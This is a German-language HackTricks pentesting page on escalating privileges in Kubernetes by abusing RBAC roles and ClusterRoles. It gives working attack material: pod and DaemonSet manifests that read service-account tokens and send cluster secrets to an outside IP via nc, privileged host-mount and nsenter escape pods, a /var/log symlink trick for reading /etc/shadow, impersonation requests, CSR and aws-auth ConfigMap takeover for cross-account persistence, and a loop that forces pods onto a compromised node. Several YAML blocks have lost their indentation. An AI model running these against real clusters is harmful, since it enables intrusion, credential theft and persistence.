# Ausnutzen von Rollen/ClusterRoles in Kubernetes

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

Hier finden Sie einige potenziell gef√§hrliche Rollen- und ClusterRoles-Konfigurationen.\
Denken Sie daran, dass Sie alle unterst√ºtzten Ressourcen mit `kubectl api-resources` abrufen k√∂nnen.

## **Privilege Escalation**

Als die Kunst, **Zugriff auf einen anderen Hauptbenutzer** innerhalb des Clusters **mit unterschiedlichen Berechtigungen** (innerhalb des Kubernetes-Clusters oder zu externen Clouds) zu erhalten, gibt es in Kubernetes im Wesentlichen **4 Haupttechniken zur Eskalation von Berechtigungen**:

* Die F√§higkeit, **andere Benutzer/Gruppen/SAs mit besseren Berechtigungen zu impersonieren** innerhalb des Kubernetes-Clusters oder zu externen Clouds
* Die F√§higkeit, **Pods zu erstellen/zu patchen/auszuf√ºhren**, in denen Sie **SAs finden oder anh√§ngen k√∂nnen** mit besseren Berechtigungen innerhalb des Kubernetes-Clusters oder zu externen Clouds
* Die F√§higkeit, **Geheimnisse zu lesen**, da die Tokens der SAs als Geheimnisse gespeichert sind
* Die F√§higkeit, **aus einem Container auf den Knoten zu entkommen**, wo Sie alle Geheimnisse der in dem Knoten ausgef√ºhrten Container, die Anmeldeinformationen des Knotens und die Berechtigungen des Knotens innerhalb der Cloud, in der er ausgef√ºhrt wird (falls vorhanden), stehlen k√∂nnen
* Eine f√ºnfte Technik, die erw√§hnenswert ist, ist die F√§higkeit, **Port-Forward** in einem Pod auszuf√ºhren, da Sie m√∂glicherweise auf interessante Ressourcen innerhalb dieses Pods zugreifen k√∂nnen.

### Zugriff auf jede Ressource oder jedes Verb (Wildcard)

Das **Wildcard (\*) gibt Berechtigungen √ºber jede Ressource mit jedem Verb**. Es wird von Admins verwendet. Innerhalb eines ClusterRoles bedeutet dies, dass ein Angreifer auf jeden Namespace im Cluster zugreifen k√∂nnte.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Zugriff auf beliebige Ressourcen mit einem bestimmten Verb

In RBAC bergen bestimmte Berechtigungen erhebliche Risiken:

1. **`create`:** Gew√§hrt die M√∂glichkeit, beliebige Cluster-Ressourcen zu erstellen und birgt das Risiko von Privilegieneskalation.
2. **`list`:** Erm√∂glicht das Auflisten aller Ressourcen und kann potenziell sensiblen Daten preisgeben.
3. **`get`:** Erlaubt den Zugriff auf Secrets von Service-Accounts und stellt eine Sicherheitsbedrohung dar.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod erstellen - Token stehlen

Ein Angreifer mit den Berechtigungen zum Erstellen eines Pods k√∂nnte einem privilegierten Service Account in den Pod anh√§ngen und das Token stehlen, um sich als den Service Account auszugeben. Dadurch k√∂nnten Berechtigungen effektiv eskaliert werden.

Beispiel eines Pods, der das Token des `bootstrap-signer` Service Accounts stehlen und an den Angreifer senden wird:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Erstellen & Entkommen

Die folgenden Punkte zeigen alle Berechtigungen, die ein Container haben kann:

* **Privilegierter Zugriff** (Deaktivierung von Schutzma√ünahmen und Festlegung von F√§higkeiten)
* **Deaktivierung der Namespaces hostIPC und hostPid**, die zur Eskalation von Berechtigungen beitragen k√∂nnen
* **Deaktivierung des hostNetwork**-Namespaces, der Zugriff erm√∂glicht, um Cloud-Berechtigungen zu stehlen und besseren Zugriff auf Netzwerke zu erhalten
* **Einbinden von hosts /** innerhalb des Containers

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Erstellen Sie das Pod mit:
```bash
kubectl --token $token create -f mount_root.yaml
```
Ein-Liner aus [diesem Tweet](https://twitter.com/mauilion/status/1129468485480751104) und mit einigen Erg√§nzungen:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
### Tarnung

Sie m√∂chten wahrscheinlich noch **unauff√§lliger** sein, auf den folgenden Seiten k√∂nnen Sie sehen, auf welche Ressourcen Sie zugreifen k√∂nnten, wenn Sie einen Pod erstellen, der nur einige der zuvor genannten Berechtigungen aktiviert:

- **Privileged + hostPID**
- Nur **Privileged**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Beispiele, wie man die zuvor genannten privilegierten Pod-Konfigurationen erstellen/missbrauchen kann, finden Sie unter_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod erstellen - In die Cloud wechseln

Wenn Sie einen **Pod erstellen** k√∂nnen (und optional ein **Service-Konto**), k√∂nnten Sie in der Lage sein, **Berechtigungen in der Cloud-Umgebung zu erhalten**, indem Sie **Cloud-Rollen einem Pod oder einem Service-Konto zuweisen** und dann darauf zugreifen.\
Dar√ºber hinaus k√∂nnen Sie, wenn Sie einen **Pod mit dem Host-Netzwerk-Namensraum erstellen k√∂nnen**, die **IAM-Rolle** der **Knoten**-Instanz **stehlen**.

Weitere Informationen finden Sie unter:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Erstellen/Patchen von Bereitstellungen, Daemonsets, Statefulsets, Replikationscontrollern, Replikasets, Jobs und Cronjobs**

Es ist m√∂glich, diese Berechtigungen zu **missbrauchen**, um einen neuen Pod zu erstellen und Berechtigungen wie im vorherigen Beispiel zu erhalten.

Das folgende YAML **erstellt ein Daemonset und schmuggelt das Token des SA** in den Pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ist eine Ressource in Kubernetes, die zum **Ausf√ºhren von Befehlen in einer Shell innerhalb eines Pods** verwendet wird. Dies erm√∂glicht es, **Befehle innerhalb der Container auszuf√ºhren oder eine Shell zu √∂ffnen**.

Daher ist es m√∂glich, **in einen Pod einzudringen und das Token des SA zu stehlen**, oder in einen privilegierten Pod einzutreten, auf den Knoten zu entkommen und alle Tokens der Pods im Knoten zu stehlen und den Knoten zu (miss)brauchen:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Diese Berechtigung erm√∂glicht es, **einen lokalen Port auf einen Port im angegebenen Pod weiterzuleiten**. Dies soll es erm√∂glichen, Anwendungen, die in einem Pod ausgef√ºhrt werden, einfach zu debuggen, aber ein Angreifer k√∂nnte sie missbrauchen, um Zugriff auf interessante (wie DBs) oder anf√§llige Anwendungen (Webs?) innerhalb eines Pods zu erhalten:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts beschreibbar /var/log/ Escape

Wie in dieser [**Forschung angegeben**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), wenn Sie auf ein Pod mit dem **hosts `/var/log/` Verzeichnis gemountet** darauf zugreifen oder ein solches erstellen k√∂nnen, k√∂nnen Sie **aus dem Container ausbrechen**.\
Dies liegt im Wesentlichen daran, dass der **Kube-API versucht, die Logs** eines Containers abzurufen (mit `kubectl logs <pod>`), indem er die Datei `0.log` des Pods √ºber den `/logs/` Endpunkt des **Kubelet**-Dienstes anfordert.\
Der Kubelet-Dienst stellt den `/logs/` Endpunkt bereit, der im Wesentlichen nur das Dateisystem `/var/log` des Containers **freigibt**.

Daher k√∂nnte ein Angreifer mit **Zugriff auf das Schreiben im /var/log/ Verzeichnis** des Containers dieses Verhalten auf 2 Arten ausnutzen:

* √Ñndern der `0.log` Datei seines Containers (normalerweise im Verzeichnis `/var/logs/pods/namespace_pod_uid/container/0.log`) so dass sie ein **Symlink, der auf `/etc/shadow` zeigt**, ist. Dann k√∂nnen Sie beispielsweise die hosts shadow Datei exfiltrieren, indem Sie:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Wenn der Angreifer einen beliebigen Hauptbenutzer mit den Berechtigungen zum Lesen von `nodes/log` kontrolliert, kann er einfach einen **Symlink** in `/host-mounted/var/log/sym` zu `/` erstellen und beim **Zugriff auf `https://<gateway>:10250/logs/sym/` wird er die Wurzel des Host-Dateisystems auflisten** (das √Ñndern des Symlinks kann den Zugriff auf Dateien erm√∂glichen).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Ein Labor und ein automatisierter Exploit finden Sie unter** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Umgehen des Schreibschutzes f√ºr readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Wenn Sie Gl√ºck haben und die hochprivilegierte F√§higkeit `CAP_SYS_ADMIN` verf√ºgbar ist, k√∂nnen Sie einfach den Ordner als rw neu einh√§ngen:
```bash
mount -o rw,remount /hostlogs/
```
#### Umgehung des Schutzes vor hostPath readOnly <a href="#umgehung-des-schutzes-vor-hostpath-readonly" id="umgehung-des-schutzes-vor-hostpath-readonly"></a>

Wie in [**dieser Forschung**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) dargelegt, ist es m√∂glich, den Schutz zu umgehen:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Was dazu gedacht war, Ausbr√ºche wie die vorherigen zu verhindern, war die Verwendung eines PersistentVolumes und eines PersistentVolumeClaims anstelle eines hostPath-Mounts, um einen Host-Ordner im Container mit Schreibzugriff einzubinden:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Nachahmung privilegierter Konten**

Mit einem [**Benutzer-Nachahmungs**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) Privileg k√∂nnte ein Angreifer ein privilegiertes Konto nachahmen.

Verwenden Sie einfach den Parameter `--as=<Benutzername>` im `kubectl`-Befehl, um einen Benutzer nachzuahmen, oder `--as-group=<Gruppe>`, um eine Gruppe nachzuahmen:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Oder verwenden Sie die REST-API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Auflisten von Geheimnissen

Die Berechtigung zum **Auflisten von Geheimnissen k√∂nnte einem Angreifer tats√§chlich erm√∂glichen, die Geheimnisse zu lesen**, indem er auf den REST-API-Endpunkt zugreift:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lesen eines Geheimnisses ‚Äì Brute-Force-Angriff auf Token-IDs

Ein Angreifer, der im Besitz eines Tokens mit Leseberechtigungen ist, ben√∂tigt den genauen Namen des Geheimnisses, um es zu verwenden. Im Gegensatz zu den umfassenderen _**Auflisten von Geheimnissen**_-Berechtigungen bestehen jedoch immer noch Schwachstellen. Standarddienstkonten im System k√∂nnen aufgelistet werden, von denen jedes mit einem Geheimnis verbunden ist. Diese Geheimnisse haben eine Namensstruktur: ein statisches Pr√§fix gefolgt von einem zuf√§lligen alphanumerischen Token mit f√ºnf Zeichen (unter Ausschluss bestimmter Zeichen) gem√§√ü dem [Quellcode](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Das Token wird aus einem begrenzten 27-Zeichen-Set generiert (`bcdfghjklmnpqrstvwxz2456789`) anstelle des vollst√§ndigen alphanumerischen Bereichs. Diese Einschr√§nkung reduziert die Gesamtanzahl m√∂glicher Kombinationen auf 14.348.907 (27^5). Folglich k√∂nnte ein Angreifer in wenigen Stunden einen Brute-Force-Angriff ausf√ºhren, um das Token zu erraten, was m√∂glicherweise zu einem Privileg-Eskalation durch den Zugriff auf sensible Dienstkonten f√ºhrt.

### Zertifikatanforderungen signieren

Wenn Sie die Verben **`create`** in der Ressource `certificatesigningrequests` haben (oder zumindest in `certificatesigningrequests/nodeClient`). K√∂nnen Sie eine **neue CeSR eines neuen Knotens erstellen**.

Gem√§√ü der [Dokumentation ist es m√∂glich, diese Anfragen automatisch zu genehmigen](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), sodass Sie in diesem Fall **keine zus√§tzlichen Berechtigungen** ben√∂tigen. Andernfalls m√ºssten Sie in der Lage sein, die Anfrage zu genehmigen, was ein Update in `certificatesigningrequests/approval` und `approve` in `signers` mit dem Ressourcennamen `<signerNameDomain>/<signerNamePath>` oder `<signerNameDomain>/*` bedeutet.

Ein **Beispiel f√ºr eine Rolle** mit allen erforderlichen Berechtigungen ist:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Also, mit der Genehmigung des neuen Knoten-Zertifikats k√∂nnen Sie die speziellen Berechtigungen der Knoten missbrauchen, um Geheimnisse zu stehlen und Privilegien zu eskalieren.

In [**diesem Beitrag**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) und [**diesem**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) wird die GKE K8s TLS-Bootstrap-Konfiguration mit automatischer Signierung konfiguriert und missbraucht, um Anmeldeinformationen f√ºr einen neuen K8s-Knoten zu generieren und diese dann zu missbrauchen, um Privilegien zu eskalieren, indem Geheimnisse gestohlen werden. Wenn Sie √ºber die genannten Berechtigungen verf√ºgen, k√∂nnten Sie dasselbe tun. Beachten Sie, dass das erste Beispiel den Fehler umgeht, der verhindert, dass ein neuer Knoten auf Geheimnisse in Containern zugreifen kann, da ein Knoten nur auf die Geheimnisse von Containern zugreifen kann, die auf ihm eingebunden sind.

Der Weg, dies zu umgehen, besteht einfach darin, Anmeldeinformationen f√ºr den Knotennamen zu erstellen, auf dem der Container mit den interessanten Geheimnissen eingebunden ist (aber pr√ºfen Sie einfach, wie es im ersten Beitrag gemacht wird):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth ConfigMaps

Prinzipale, die **`configmaps`** im kube-system Namespace auf EKS √§ndern k√∂nnen (m√ºssen in AWS sein), k√∂nnen Cluster-Admin-Berechtigungen erhalten, indem sie die **aws-auth** ConfigMap √ºberschreiben.\
Die ben√∂tigten Verben sind **`update`** und **`patch`**, oder **`create`**, wenn die ConfigMap nicht erstellt wurde:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Sie k√∂nnen **`aws-auth`** f√ºr **Persistenz** verwenden, um Benutzern aus **anderen Konten** Zugriff zu gew√§hren.

Jedoch funktioniert `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nicht von einem anderen Konto aus**. Aber tats√§chlich funktioniert `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`, wenn Sie die ARN des Clusters anstelle des Namens angeben.\
Um `kubectl` zum Laufen zu bringen, stellen Sie einfach sicher, dass Sie die **Kubeconfig des Opfers konfigurieren** und in den aws exec-Argumenten `--profile other_account_role` hinzuf√ºgen, damit kubectl das Profil des anderen Kontos verwendet, um das Token zu erhalten und sich mit AWS in Verbindung zu setzen.
{% endhint %}

### Eskalation in GKE

Es gibt **2 M√∂glichkeiten, K8s-Berechtigungen f√ºr GCP-Prinzipale zuzuweisen**. In jedem Fall ben√∂tigt der Prinzipal auch die Berechtigung **`container.clusters.get`**, um Anmeldeinformationen zum Zugriff auf den Cluster zu sammeln, oder Sie m√ºssen **Ihre eigene kubectl-Konfigurationsdatei generieren** (folgen Sie dem n√§chsten Link).

{% hint style="warning" %}
Beim Sprechen mit dem K8s-API-Endpunkt wird das **GCP-Authentifizierungstoken gesendet**. Dann wird GCP √ºber den K8s-API-Endpunkt zuerst **√ºberpr√ºfen, ob der Prinzipal** (per E-Mail) **irgendeinen Zugriff innerhalb des Clusters hat**, dann wird √ºberpr√ºft, ob er **irgendeinen Zugriff √ºber GCP IAM hat**.\
Wenn **eines** davon **zutrifft**, wird er **beantwortet**. Wenn **nicht**, wird ein **Fehler** gemeldet, der darauf hinweist, Berechtigungen √ºber GCP IAM zu erteilen.
{% endhint %}

Dann ist die erste Methode die Verwendung von **GCP IAM**, die K8s-Berechtigungen haben ihre **entsprechenden GCP IAM-Berechtigungen**, und wenn der Prinzipal diese hat, kann er sie verwenden.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Die zweite Methode besteht darin, **K8s-Berechtigungen innerhalb des Clusters** dem Benutzer anhand seiner **E-Mail** zuzuweisen (einschlie√ülich GCP-Servicekonten).

### Erstellen von Serviceaccounts-Token

Prinzipale, die **TokenRequests erstellen k√∂nnen** (`serviceaccounts/token`) (Informationen von [**hier**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### Ephemeralcontainers

Prinzipale, die **`pods/ephemeralcontainers`** **`update`** oder **`patch`** k√∂nnen **Code auf anderen Pods ausf√ºhren** und potenziell √ºber einen ephemeral Container mit einem privilegierten securityContext auf ihren Knoten ausbrechen.

### ValidatingWebhookConfigurations oder MutatingWebhookConfigurations

Prinzipale mit einem der Verben `create`, `update` oder `patch` √ºber `validatingwebhookconfigurations` oder `mutatingwebhookconfigurations` k√∂nnten in der Lage sein, eine solche Webhook-Konfiguration zu erstellen, um **Berechtigungen zu eskalieren**.

F√ºr ein Beispiel zu [`mutatingwebhookconfigurations` siehe diesen Abschnitt dieses Beitrags](./#malicious-admission-controller).

### Eskalation

Wie Sie im n√§chsten Abschnitt lesen k√∂nnen: [**Eingebaute Vorbeugung gegen privilegierte Eskalation**](./#built-in-privileged-escalation-prevention), ein Prinzipal kann weder Rollen noch Clusterrollen aktualisieren oder erstellen, ohne selbst diese neuen Berechtigungen zu haben. Es sei denn, er hat das **Verb `escalate`** √ºber **`roles`** oder **`clusterroles`.**\
Dann kann er neue Rollen und Clusterrollen mit besseren Berechtigungen als die, die er hat, aktualisieren/erstellen.

### Knoten-Proxy

Prinzipale mit Zugriff auf die **`nodes/proxy`**-Unterressource k√∂nnen √ºber die Kubelet-API **Code auf Pods ausf√ºhren** (gem√§√ü [**diesem**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Weitere Informationen zur Kubelet-Authentifizierung auf dieser Seite:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Hier finden Sie ein Beispiel, wie Sie [**RCE autorisiert mit einer Kubelet-API sprechen**](../pentesting-kubernetes-services/#kubelet-rce).

### Pods l√∂schen + nicht planbare Knoten

Prinzipale, die **Pods l√∂schen** k√∂nnen (`delete`-Verb √ºber Ressource `pods`), oder **Pods evakuieren** k√∂nnen (`create`-Verb √ºber Ressource `pods/eviction`), oder **den Pod-Status √§ndern** k√∂nnen (Zugriff auf `pods/status`) und Knoten **nicht planbar machen** k√∂nnen (Zugriff auf `nodes/status`) oder **Knoten l√∂schen** k√∂nnen (`delete`-Verb √ºber Ressource `nodes`) und die Kontrolle √ºber einen Pod haben, k√∂nnten **Pods von anderen Knoten stehlen**, sodass sie auf dem **kompromittierten Knoten** ausgef√ºhrt werden und der Angreifer die Tokens von diesen Pods **stehlen** kann.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Dienststatus (CVE-2020-8554)

Prinzipale, die **`services/status`** **√§ndern** k√∂nnen, k√∂nnen das Feld `status.loadBalancer.ingress.ip` ausnutzen, um die **ungefixte CVE-2020-8554** zu nutzen und **MiTM-Angriffe gegen den Cluster** zu starten. Die meisten Ma√ünahmen gegen CVE-2020-8554 verhindern nur ExternalIP-Dienste (gem√§√ü [**diesem**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Knoten- und Pod-Status

Prinzipale mit **`update`** oder **`patch`** Berechtigungen √ºber `nodes/status` oder `pods/status` k√∂nnten Labels √§ndern, um die durchgesetzten Terminierungsbeschr√§nkungen zu beeinflussen.

## Eingebaute Vorbeugung gegen privilegierte Eskalation

Kubernetes verf√ºgt √ºber einen [eingebauten Mechanismus](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) zur Verhinderung von privilegierter Eskalation.

Dieses System stellt sicher, dass **Benutzer ihre Berechtigungen nicht erh√∂hen k√∂nnen, indem sie Rollen oder Rollenbindungen √§ndern**. Die Durchsetzung dieser Regel erfolgt auf API-Ebene und bietet einen Schutz, selbst wenn der RBAC-Autorisierer inaktiv ist.

Die Regel besagt, dass ein **Benutzer nur eine Rolle erstellen oder aktualisieren kann, wenn er alle Berechtigungen besitzt, die die Rolle umfasst**. Dar√ºber hinaus muss der Umfang der vorhandenen Berechtigungen des Benutzers mit dem der Rolle, die er zu erstellen oder zu √§ndern versucht, √ºbereinstimmen: entweder clusterweit f√ºr ClusterRoles oder auf denselben Namespace (oder clusterweit) beschr√§nkt f√ºr Roles.

{% hint style="warning" %}
Es gibt eine Ausnahme von der vorherigen Regel. Wenn ein Prinzipal das **Verb `escalate`** √ºber **`roles`** oder **`clusterroles`** hat, kann er die Berechtigungen von Rollen und ClusterRoles erh√∂hen, auch ohne die Berechtigungen selbst zu besitzen.
{% endhint %}

### **Rollenbindungen/ClusterRoleBindings abrufen & √§ndern**

{% hint style="danger" %}
**Anscheinend hat diese Technik fr√ºher funktioniert, aber laut meinen Tests funktioniert sie nicht mehr aus demselben Grund, der im vorherigen Abschnitt erkl√§rt wurde. Du kannst keine Rollebindungen erstellen/√§ndern, um dir oder einem anderen SA einige Berechtigungen zu geben, wenn du sie nicht bereits hast.**
{% endhint %}

Die Berechtigung zum Erstellen von Rollenbindungen erm√∂glicht es einem Benutzer, **Rollen an einen Dienstaccount zu binden**. Diese Berechtigung kann potenziell zu einer privilegierten Eskalation f√ºhren, da es dem Benutzer erm√∂glicht, Admin-Berechtigungen an einen kompromittierten Dienstaccount zu binden.

## Andere Angriffe

### Sidecar-Proxy-App

Standardm√§√üig gibt es keine Verschl√ºsselung in der Kommunikation zwischen Pods. Gegenseitige Authentifizierung, beidseitig, Pod zu Pod.

#### Erstellen einer Sidecar-Proxy-App <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Erstelle deine .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Bearbeite deine .yaml und f√ºge die auskommentierten Zeilen hinzu:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Siehe die Logs des Proxys:
```bash
kubectl logs app -C proxy
```
